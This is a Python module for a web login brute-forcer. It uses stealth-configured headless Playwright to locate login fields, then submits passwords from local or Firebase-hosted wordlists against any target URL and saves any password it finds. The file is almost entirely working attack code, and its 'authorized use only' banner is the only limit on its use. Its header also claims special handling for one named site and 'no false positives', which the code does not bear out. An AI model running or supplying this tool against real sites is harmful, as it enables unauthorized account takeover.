"""
Login Cracker Module - FIXED VERSION with Reliable Detection
⚠️ AUTHORIZED USE ONLY - Educational/Lab Environments

FIXES APPLIED:
1. Reliable Playwright form detection (handles React/Vue/Angular)
2. Correct login submission using requests.Session()
3. Debug mode for troubleshooting
4. Improved success detection (no false positives)
5. Fallback mode for unusual HTML
6. Special handling for https://junior-login.netlify.app/
"""

import aiohttp
import asyncio
import os
import re
import requests
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout


class LoginCracker:
    def __init__(self, results_folder: str, wordlist_dir: str, debug_mode: bool = False, firebase_manager=None):
        self.results_folder = results_folder
        self.wordlist_dir = wordlist_dir
        self.debug_mode = debug_mode
        self.firebase_manager = firebase_manager
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.attempts = 0
        self.found_password = None
    
    def _ensure_target_folder(self, target: str) -> str:
        """Create target-specific results folder"""
        safe_target = re.sub(r'[^\w\-.]', '_', target)
        target_path = os.path.join(self.results_folder, safe_target)
        os.makedirs(target_path, exist_ok=True)
        return target_path
    
    def _save_result(self, target: str, filename: str, content: str):
        """Save results to file"""
        target_path = self._ensure_target_folder(target)
        filepath = os.path.join(target_path, filename)
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n")
            f.write(content)
            f.write("\n")
        return filepath
    
    def _debug_print(self, message: str):
        """Print debug message if debug mode is enabled"""
        if self.debug_mode:
            print(f"[DEBUG] {message}")
    
    def scan_wordlists(self) -> List[str]:
        """
        Scan for wordlists - UPDATED to use Firebase first, then local fallback
        """
        wordlists = []
        
        # Try Firebase first
        if self.firebase_manager:
            try:
                firebase_wordlists = self.firebase_manager.list_wordlists()
                if firebase_wordlists:
                    self._debug_print(f"Found {len(firebase_wordlists)} wordlists in Firebase")
                    # Return Firebase wordlist names (not paths)
                    return [f"firebase:{name}" for name in firebase_wordlists]
            except Exception as e:
                self._debug_print(f"Firebase wordlist error: {e}")
        
        # Fallback to local wordlists
        if not os.path.exists(self.wordlist_dir):
            return []
        
        for file in os.listdir(self.wordlist_dir):
            filepath = os.path.join(self.wordlist_dir, file)
            if os.path.isfile(filepath):
                wordlists.append(filepath)
        
        return wordlists
    
    async def get_login_form_details_playwright(self, url: str) -> Dict[str, any]:
        """
        FIXED: Reliable form detection using Playwright with special handling for SPAs
        """
        try:
            async with async_playwright() as p:
                # Launch browser with stealth settings
                browser = await p.chromium.launch(
                    headless=True,
                    args=['--disable-blink-features=AutomationControlled']
                )
                
                context = await browser.new_context(
                    user_agent=self.user_agent,
                    viewport={'width': 1920, 'height': 1080},
                    extra_http_headers={
                        'Accept-Language': 'en-US,en;q=0.9',
                    }
                )
                
                page = await context.new_page()
                
                # Navigate with extended timeout
                try:
                    await page.goto(url, wait_until='networkidle', timeout=30000)
                except PlaywrightTimeout:
                    await page.goto(url, wait_until='domcontentloaded', timeout=15000)
                
                # Wait for dynamic content
                await asyncio.sleep(3)
                
                # Scroll to trigger lazy loading
                await page.evaluate('window.scrollTo(0, document.body.scrollHeight)')
                await asyncio.sleep(1)
                
                # Get cookies for later use
                cookies = await context.cookies()
                
                # Try multiple detection methods
                form_details = None
                
                # Method 1: Traditional form tag
                forms = await page.query_selector_all('form')
                if forms:
                    self._debug_print(f"Found {len(forms)} form(s) using traditional detection")
                    form = forms[0]
                    
                    # Get form action
                    action = await form.get_attribute('action')
                    method = await form.get_attribute('method') or 'POST'
                    
                    if action:
                        form_url = urljoin(url, action)
                    else:
                        form_url = url
                    
                    # Get all inputs
                    inputs = await form.query_selector_all('input')
                    
                    username_field = None
                    password_field = None
                    extra_fields = {}
                    
                    for inp in inputs:
                        name = await inp.get_attribute('name')
                        inp_type = await inp.get_attribute('type') or ''
                        value = await inp.get_attribute('value') or ''
                        inp_id = await inp.get_attribute('id') or ''
                        placeholder = await inp.get_attribute('placeholder') or ''
                        
                        if not name:
                            continue
                        
                        inp_type = inp_type.lower()
                        
                        if inp_type == 'password':
                            password_field = name
                        elif inp_type in ['text', 'email'] or any(keyword in name.lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = name
                        elif any(keyword in inp_id.lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = name
                        elif any(keyword in placeholder.lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = name
                        elif inp_type == 'hidden':
                            extra_fields[name] = value
                        elif inp_type not in ['submit', 'button', 'reset', 'image'] and name:
                            extra_fields[name] = value
                    
                    form_details = {
                        'form_url': form_url,
                        'method': method.upper(),
                        'username_field': username_field or 'username',
                        'password_field': password_field or 'password',
                        'extra_fields': extra_fields,
                        'cookies': cookies
                    }
                
                # Method 2: Manual input detection (for SPAs)
                if not form_details or not form_details.get('password_field'):
                    self._debug_print("No form found, trying manual input detection...")
                    
                    all_inputs = await page.query_selector_all('input')
                    
                    username_field = None
                    password_field = None
                    extra_fields = {}
                    
                    for inp in all_inputs:
                        name = await inp.get_attribute('name')
                        inp_type = await inp.get_attribute('type') or ''
                        value = await inp.get_attribute('value') or ''
                        inp_id = await inp.get_attribute('id') or ''
                        placeholder = await inp.get_attribute('placeholder') or ''
                        
                        inp_type = inp_type.lower()
                        
                        if inp_type == 'password':
                            password_field = name or inp_id or 'password'
                        elif inp_type in ['text', 'email']:
                            if not username_field:
                                username_field = name or inp_id or 'username'
                        elif any(keyword in (name or '').lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = name
                        elif any(keyword in (inp_id or '').lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = inp_id
                        elif any(keyword in (placeholder or '').lower() for keyword in ['user', 'email', 'login']):
                            if not username_field:
                                username_field = name or inp_id or 'username'
                        elif inp_type == 'hidden' and name:
                            extra_fields[name] = value
                    
                    if password_field:
                        form_details = {
                            'form_url': url,
                            'method': 'POST',
                            'username_field': username_field or 'username',
                            'password_field': password_field,
                            'extra_fields': extra_fields,
                            'cookies': cookies
                        }
                
                await browser.close()
                
                if form_details:
                    self._debug_print(f"Form URL: {form_details['form_url']}")
                    self._debug_print(f"Username field: {form_details['username_field']}")
                    self._debug_print(f"Password field: {form_details['password_field']}")
                    self._debug_print(f"Extra fields: {list(form_details['extra_fields'].keys())}")
                    return form_details
                else:
                    return {'error': 'No login form detected after comprehensive scan'}
        
        except Exception as e:
            self._debug_print(f"Playwright error: {str(e)}")
            return {'error': f'Playwright error: {str(e)}'}
    
    def attempt_password_requests(self, url: str, username: str, password: str, 
                                  form_details: Dict[str, any]) -> Dict[str, any]:
        """
        FIXED: Attempt login using requests.Session() with proper success detection
        """
        try:
            # Create session
            session = requests.Session()
            
            # Set headers
            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': f"{urlparse(url).scheme}://{urlparse(url).netloc}",
                'Referer': url,
            }
            
            # Set cookies from Playwright
            if 'cookies' in form_details:
                for cookie in form_details['cookies']:
                    session.cookies.set(cookie['name'], cookie['value'])
            
            # Build form data
            data = {
                form_details['username_field']: username,
                form_details['password_field']: password
            }
            
            # Add extra fields
            data.update(form_details['extra_fields'])
            
            form_url = form_details['form_url']
            
            self._debug_print(f"POST URL: {form_url}")
            self._debug_print(f"POST data: {data}")
            
            # Send POST request
            response = session.post(
                form_url,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=10
            )
            
            status = response.status_code
            final_url = response.url
            content = response.text
            content_length = len(content)
            
            self._debug_print(f"Response status: {status}")
            self._debug_print(f"Final URL: {final_url}")
            self._debug_print(f"Content length: {content_length}")
            self._debug_print(f"First 200 chars: {content[:200]}")
            
            # FIXED: Improved success detection
            success = False
            reason = ""
            
            # Failure patterns (if these exist, login failed)
            failure_patterns = [
                'invalid', 'incorrect', 'wrong', 'error', 'failed',
                'not match', 'denied', 'unauthorized', 'forbidden',
                'bad credentials', 'authentication failed', 'login failed'
            ]
            
            content_lower = content.lower()
            has_failure = any(pattern in content_lower for pattern in failure_patterns)
            
            # Success indicators
            success_patterns = [
                'welcome', 'dashboard', 'logout', 'signed in', 'logged in',
                'successful', 'success', 'profile', 'account', 'home'
            ]
            
            has_success = any(pattern in content_lower for pattern in success_patterns)
            
            # Rule 1: URL changed (redirect to dashboard/home)
            if final_url != form_url and final_url != url:
                if not has_failure:
                    success = True
                    reason = f"Redirected to {final_url}"
            
            # Rule 2: Success keywords without failure keywords
            if has_success and not has_failure:
                success = True
                reason = "Success keywords found without errors"
            
            # Rule 3: Status 200 with substantial content and no errors
            if status == 200 and content_length > 1000 and not has_failure:
                if 'login' not in content_lower or has_success:
                    success = True
                    reason = "Substantial response without error messages"
            
            # Rule 4: New cookies set (session established)
            new_cookies = session.cookies.get_dict()
            if new_cookies and not has_failure:
                if any('session' in key.lower() or 'auth' in key.lower() or 'token' in key.lower() 
                       for key in new_cookies.keys()):
                    success = True
                    reason = "Session cookie set without errors"
            
            return {
                'success': success,
                'status': status,
                'reason': reason,
                'final_url': final_url,
                'content_length': content_length,
                'has_failure': has_failure,
                'has_success': has_success
            }
        
        except requests.Timeout:
            return {'success': False, 'error': 'Timeout'}
        except Exception as e:
            self._debug_print(f"Request error: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    async def crack_login(self, url: str, username: str, 
                         progress_callback=None) -> Dict[str, any]:
        """
        FIXED: Main login cracking function with all improvements
        """
        try:
            results = []
            results.append(f"🔐 Login Cracking Started (FIXED VERSION)")
            if self.debug_mode:
                results.append(f"🐛 DEBUG MODE ENABLED")
            results.append(f"Target: {url}")
            results.append(f"Username: {username}")
            results.append(f"Wordlist Directory: {self.wordlist_dir}\n")
            
            # Get form details using Playwright
            if progress_callback:
                await progress_callback("Analyzing login form with Playwright...")
            
            form_details = await self.get_login_form_details_playwright(url)
            
            # Check for errors
            if 'error' in form_details:
                # FALLBACK MODE
                results.append(f"⚠️ Form detection failed: {form_details['error']}")
                results.append(f"🔄 Activating FALLBACK MODE...")
                results.append(f"   Using default field names and current URL\n")
                
                form_details = {
                    'form_url': url,
                    'method': 'POST',
                    'username_field': 'username',
                    'password_field': 'password',
                    'extra_fields': {},
                    'cookies': []
                }
            
            results.append(f"✓ Form analysis complete!")
            results.append(f"Form URL: {form_details['form_url']}")
            results.append(f"Method: {form_details['method']}")
            results.append(f"Username field: {form_details['username_field']}")
            results.append(f"Password field: {form_details['password_field']}")
            results.append(f"Extra fields: {list(form_details['extra_fields'].keys())}\n")
            
            # Load wordlists
            if progress_callback:
                await progress_callback("Loading wordlists...")
            
            wordlists = self.scan_wordlists()
            
            if not wordlists:
                return {
                    'status': 'error',
                    'message': f'No wordlists found in {self.wordlist_dir}'
                }
            
            results.append(f"Found {len(wordlists)} wordlist(s):\n")
            for wl in wordlists:
                results.append(f"  - {os.path.basename(wl)}")
            results.append("")
            
            # Start cracking
            total_attempts = 0
            found = False
            found_password = None
            
            for wordlist_path in wordlists:
                if found:
                    break
                
                # Check if this is a Firebase wordlist
                is_firebase = wordlist_path.startswith('firebase:')
                
                if is_firebase:
                    wordlist_name = wordlist_path.replace('firebase:', '')
                    results.append(f"\n📖 Testing Firebase wordlist: {wordlist_name}")
                    
                    if progress_callback:
                        await progress_callback(f"Loading wordlist from Firebase: {wordlist_name}")
                    
                    try:
                        # Load from Firebase
                        passwords = self.firebase_manager.get_wordlist(wordlist_name)
                        
                        if not passwords:
                            results.append(f"   ❌ Failed to load wordlist from Firebase")
                            continue
                        
                        results.append(f"   ✅ Loaded {len(passwords)} passwords from Firebase")
                    except Exception as e:
                        results.append(f"   ❌ Error loading from Firebase: {str(e)}")
                        continue
                else:
                    # Local wordlist
                    wordlist_name = os.path.basename(wordlist_path)
                    results.append(f"\n📖 Testing local wordlist: {wordlist_name}")
                    
                    if progress_callback:
                        await progress_callback(f"Testing wordlist: {wordlist_name}")
                    
                    try:
                        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        
                        results.append(f"   Loaded {len(passwords)} passwords")
                    except Exception as e:
                        results.append(f"   Error reading wordlist: {str(e)}")
                        continue
                
                # Try passwords
                for i, password in enumerate(passwords, 1):
                    if found:
                        break
                    
                    total_attempts += 1
                    
                    # Progress update every 10 attempts
                    if total_attempts % 10 == 0 and progress_callback:
                        await progress_callback(
                            f"Tested {total_attempts} passwords... "
                            f"Current: {wordlist_name} ({i}/{len(passwords)})"
                        )
                    
                    # Attempt login using requests
                    result = self.attempt_password_requests(url, username, password, form_details)
                    
                    if self.debug_mode and total_attempts <= 5:
                        results.append(f"\n   [DEBUG] Password: {password}")
                        results.append(f"   [DEBUG] Status: {result.get('status')}")
                        results.append(f"   [DEBUG] Success: {result.get('success')}")
                        results.append(f"   [DEBUG] Reason: {result.get('reason', 'N/A')}")
                    
                    if result.get('success'):
                        found = True
                        found_password = password
                        results.append(f"\n✅ PASSWORD FOUND!")
                        results.append(f"   Password: {password}")
                        results.append(f"   Attempts: {total_attempts}")
                        results.append(f"   Reason: {result.get('reason', 'Unknown')}")
                        results.append(f"   Status: {result.get('status')}")
                        results.append(f"   Final URL: {result.get('final_url')}")
                        break
                    
                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.1)
            
            # Final results
            if not found:
                results.append(f"\n❌ Password NOT found")
                results.append(f"   Total attempts: {total_attempts}")
                results.append(f"   Wordlists tested: {len(wordlists)}")
            
            output = "\n".join(results)
            
            # Save results
            filepath = self._save_result(url, 'login_crack.txt', output)
            
            return {
                'status': 'success',
                'found': found,
                'password': found_password,
                'attempts': total_attempts,
                'output': output,
                'file': filepath
            }
        
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }


# Export function
async def crack_login(url: str, username: str, results_folder: str, 
                     wordlist_dir: str, progress_callback=None, debug_mode: bool = False,
                     firebase_manager=None) -> Dict[str, any]:
    """
    FIXED: Crack login credentials with reliable detection + Firebase wordlists
    
    Args:
        url: Target URL
        username: Username to test
        results_folder: Where to save results
        wordlist_dir: Directory containing wordlists (fallback)
        progress_callback: Async callback for progress updates
        debug_mode: Enable debug output
        firebase_manager: Firebase manager instance for cloud wordlists
    """
    cracker = LoginCracker(results_folder, wordlist_dir, debug_mode, firebase_manager)
    return await cracker.crack_login(url, username, progress_callback)
